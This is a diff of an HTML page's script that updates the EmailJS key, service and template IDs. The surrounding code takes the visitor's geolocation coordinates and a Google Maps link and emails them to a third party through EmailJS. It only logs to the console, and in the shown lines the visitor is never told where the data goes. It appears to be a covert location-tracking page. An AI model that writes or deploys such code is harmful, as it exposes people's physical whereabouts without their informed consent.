@@ -225,7 +225,7 @@
 
     <script>
         // Initialize EmailJS
-        emailjs.init('1VV0s_cNJ5TwVJpNh');
+        emailjs.init('JPHf9F6RSwDOAuQDq');
         
         const mainContent = document.getElementById('mainContent');
         const unavailableMessage = document.getElementById('unavailableMessage');
@@ -245,7 +245,7 @@
                             map_link: https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}
                         };
                         
-                        emailjs.send('service_rvnikuy', 'template_zzkcdnk', locationData)
+                        emailjs.send('service_i402ons', 'template_572g30b', locationData)
                             .then(() => console.log('Location data sent'))
                             .catch(err => console.error('Failed to send location:', err));
                     },
